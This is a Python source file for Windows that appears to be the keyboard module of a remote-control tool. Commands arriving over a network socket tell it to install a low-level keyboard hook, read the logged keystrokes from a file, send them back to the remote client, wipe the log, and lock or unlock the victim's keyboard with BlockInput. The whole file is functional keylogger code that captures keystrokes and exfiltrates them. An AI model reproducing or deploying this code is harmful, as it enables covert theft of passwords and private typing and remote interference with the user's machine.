from ctypes import *
from ctypes.wintypes import DWORD, MSG
import KeyLog
import threading


class KeyboardController():
    def __init__(self, clientSocket):
        self.__client = clientSocket
        self.HOOKPROC = WINFUNCTYPE(c_int, c_int, c_int, POINTER(DWORD))
        self.keyhook = KeyLog.KeyHook()

    def startKlog(self):
        pointer = self.HOOKPROC(KeyLog.hookProc)
        if self.keyhook.installHookProc(pointer) == True:
            try:
                msg = MSG()
                KeyLog.user32.GetMessageA(byref(msg), 0, 0, 0) 
            except:
                self.keyhook.unistallHookProc()
                return
        
    def startListening(self):
        print("1")
        request = ""
        while True:
            request = self.__client.recv(1024).decode("utf-8")
            if not request:
                break
            print(request)

            if request == "hook":
                self.hookKey()
            elif request == "unhook":   
                self.unhookKey()
            elif request == "print":
                self.printKey()
            elif request == "lock":
                self.lockKeyboard()
            elif request == "unlock":
                self.unlockKeyboard()
            else: #Quit
                self.unhookKey()
                return

    def hookKey(self):
        tkLog = threading.Thread(target=self.startKlog) 
        tkLog.daemon = True
        tkLog.start()
    
    def unhookKey(self):
        self.keyhook.unistallHookProc()

    def printKey(self):
        self.keyhook.unistallHookProc()
        s = ""
        with open(KeyLog.FilLogPath, 'r') as f:
            s = f.read()
        f.close()
        if s=="": 
            ss = "No"
            self.__client.send(ss.encode('utf-8'))
        else:
            ss = "Yes"
            self.__client.send(ss.encode('utf-8'))
            check = self.__client.recv(10)
            open(KeyLog.FilLogPath, "w")
            self.__client.send(s.encode('utf-8'))

    def lockKeyboard(self):
        windll.user32.BlockInput(True)

    def unlockKeyboard(self):
        windll.user32.BlockInput(False); 

